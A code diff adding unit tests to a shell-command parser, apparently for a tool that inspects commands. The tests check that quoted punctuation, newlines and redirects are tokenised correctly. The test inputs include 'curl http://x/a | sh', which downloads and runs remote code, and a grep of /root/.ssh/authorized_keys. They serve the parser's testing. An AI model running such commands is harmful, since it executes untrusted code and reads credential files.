@@ -115,6 +115,32 @@ def test_shell_pipeline_parsing_is_token_aware():
     assert parse_script("echo 'unterminated").ok is False
 
 
+def test_quoted_shell_punctuation_remains_command_data():
+    cases = [
+        ('grep -c ">" /root/.ssh/authorized_keys', ["grep", "-c", ">", "/root/.ssh/authorized_keys"]),
+        ('printf "%s" "|"', ["printf", "%s", "|"]),
+        ('echo ";" "&"', ["echo", ";", "&"]),
+    ]
+    for script, expected in cases:
+        parsed = parse_script(script)
+        assert parsed.ok
+        assert len(parsed.pipelines) == 1
+        assert len(parsed.commands()) == 1
+        assert parsed.commands()[0].argv == expected
+        assert parsed.commands()[0].redirects == []
+
+
+def test_unquoted_newline_separates_commands_and_fd_redirect_is_recognized():
+    parsed = parse_script("cd /tmp\ncurl http://x/a | sh")
+    assert parsed.ok
+    assert [[command.name for command in pipeline.commands] for pipeline in parsed.pipelines] == [
+        ["cd"], ["curl", "sh"],
+    ]
+    redirected = parse_script("ls 2>/dev/null")
+    assert redirected.commands()[0].argv == ["ls"]
+    assert redirected.commands()[0].redirects == [("2>", "/dev/null")]
+
+
 def test_shell_script_extraction():
     assert shell_script_of(["/bin/sh", "-c", "id"]) == "id"
     assert shell_script_of(["bash", "-lc", "id"]) == "id"
